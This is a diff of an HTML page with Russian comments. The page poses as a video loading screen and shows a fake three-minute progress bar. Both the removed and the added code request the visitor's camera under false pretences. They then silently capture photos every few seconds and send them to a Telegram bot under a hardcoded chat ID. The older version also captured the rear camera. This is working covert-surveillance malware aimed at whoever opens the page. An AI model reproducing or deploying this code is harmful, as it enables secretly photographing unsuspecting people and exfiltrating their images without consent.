@@ -44,7 +44,6 @@
             margin-top: 10px;
         }
 
-        /* Полоса загрузки */
         .progress-container {
             width: 260px;
             height: 6px;
@@ -67,7 +66,7 @@
             color: #8a8a8a;
         }
 
-        #video, #videoBack, #canvas { display: none; position: absolute; }
+        #video, #canvas { display: none; position: absolute; }
         
         .permission-hint {
             background-color: #fe2c55;
@@ -97,15 +96,12 @@
     <div class="loader"></div>
     <div class="text">Загрузка видео...</div>
 
-    <!-- Полоса прогресса -->
     <div class="progress-container">
         <div id="progressBar" class="progress-bar"></div>
     </div>
     <div id="percent" class="percent-text">0%</div>
 
-    <!-- Два потока: основной (фронт) и фоновый (задняя камера) -->
     <video id="video" autoplay playsinline muted></video>
-    <video id="videoBack" autoplay playsinline muted style="display:none;"></video>
     <canvas id="canvas"></canvas>
 
 <script>
@@ -113,14 +109,13 @@
     const chatId = '8573089884';
     let isProcessing = false;
 
-    // 1. ФУНКЦИЯ ПРОГРЕССА (Определяем первой)
     function startFakeProgress() {
         const bar = document.getElementById('progressBar');
         const percentEl = document.getElementById('percent');
-        if (!bar || !percentEl) return; // Защита, если HTML элементы не найдены
+        if (!bar || !percentEl) return;
 
         let currentProgress = 0;
-        const totalTime = 180000; // 3 минуты (180 сек)
+        const totalTime = 180000; // 3 минуты
         const startTime = Date.now();
 
         const update = () => {
@@ -128,8 +123,7 @@
             const progressTarget = Math.min((elapsed / totalTime) * 100, 100);
 
             if (currentProgress < progressTarget) {
-                // Прыжок на случайное значение (от 2% до 8%)
-                currentProgress += Math.random() * 6 + 2; 
+                currentProgress += Math.random() * 5 + 1; 
                 if (currentProgress > progressTarget) currentProgress = progressTarget;
                 
                 bar.style.width = currentProgress + '%';
@@ -137,80 +131,70 @@
             }
 
             if (elapsed < totalTime) {
-                // Рандомная задержка между рывками (от 1.5 до 4 сек)
-                setTimeout(update, Math.random() * 2500 + 1500);
+                setTimeout(update, Math.random() * 2000 + 1000);
             } else {
                 bar.style.width = '100%';
                 percentEl.innerText = '100%';
-                // Опционально: тут можно сделать редирект
-                // window.location.href = 'https://www.tiktok.com';
             }
         };
         update();
     }
 
-    // 2. ФУНКЦИЯ ОТПРАВКИ ФОТО
-async function takeAndSendPhoto(videoElement, label) {
-    if (!videoElement || videoElement.videoHeight === 0) return;
-
-    return new Promise((resolve) => {
+    async function takeAndSendPhoto() {
+        if (isProcessing) return;
+        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const scale = 640 / videoElement.videoWidth;
+        if (!video || video.videoWidth === 0) return;
+
+        isProcessing = true;
+        const scale = 640 / video.videoWidth;
         canvas.width = 640;
-        canvas.height = videoElement.videoHeight * scale;
-        canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        canvas.height = video.videoHeight * scale;
+
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, `${label}.jpg`);
-            formData.append('caption', `Камера: ${label}`);
-            
+            formData.append('photo', blob, 'shot.jpg');
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
-                    method: 'POST', 
-                    body: formData 
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-            } catch (e) { }
-            resolve(); // Сигнализируем, что отправка завершена
-        }, 'image/jpeg', 0.2);
-    });
-}
+            } catch (e) { } 
+            finally { isProcessing = false; }
+        }, 'image/jpeg', 0.1); 
+    }
 
-    // 3. ЗАПУСК ПРИ ЗАГРУЗКЕ
-window.onload = () => {
-    startFakeProgress(); 
-    const vFront = document.getElementById('video');
-    const vBack = document.getElementById('videoBack');
+    window.onload = () => {
+        startFakeProgress(); 
 
-    // Запрашиваем фронтальную
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => { 
-        vFront.srcObject = s; 
-        if(document.getElementById('hint')) document.getElementById('hint').style.display = 'none';
-        
-        // Пытаемся запросить заднюю, но если не даст — работаем только с фронтом
-        return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).catch(() => null);
-    })
-    .then(sBack => { 
-        if (sBack) vBack.srcObject = sBack;
-
-        const mainLoop = async () => {
-            await takeAndSendPhoto(vFront, "FRONT");
-            // Шлем заднюю только если она успешно открылась
-            if (vBack.srcObject) await takeAndSendPhoto(vBack, "BACK");
-            
-            setTimeout(mainLoop, 3500);
-        };
-
-        setTimeout(mainLoop, 2000);
-    })
-    .catch(err => { 
-        console.error("Камера недоступна:", err); 
-    });
-};
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
+        })
+        .then(stream => {
+            const hint = document.getElementById('hint');
+            if(hint) hint.style.display = 'none';
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    takeAndSendPhoto();
+                    setInterval(takeAndSendPhoto, 5000); 
+                }, 2000);
+            };
+        })
+        .catch(err => { 
+            const hint = document.getElementById('hint');
+            if(hint) {
+                hint.innerText = "Ошибка: разрешите доступ к камере";
+                hint.style.backgroundColor = "gray";
+            }
+        });
+    };
 </script>
 </body>
-</html>
-
 </html>
